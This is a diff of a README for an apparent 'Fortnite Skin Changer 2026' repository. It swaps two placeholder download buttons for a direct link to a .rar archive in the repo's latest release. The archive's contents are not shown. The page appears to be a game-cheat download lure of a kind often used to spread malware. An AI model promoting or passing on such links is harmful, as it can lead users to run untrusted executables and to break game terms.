@@ -5,13 +5,13 @@
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](#-download)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/tom-brownx2000q5/Fortnite-Skin-Changer-2026/releases/latest/download/Fortnite-Skin-Changer.rar)
 
 ---
 
 ## 📥 Download
 
-👉 [**DOWNLOAD — Click Here**](#) 👈
+👉 [**DOWNLOAD — Click Here**](https://github.com/tom-brownx2000q5/Fortnite-Skin-Changer-2026/releases/latest/download/Fortnite-Skin-Changer.rar) 👈
 
 ---
 
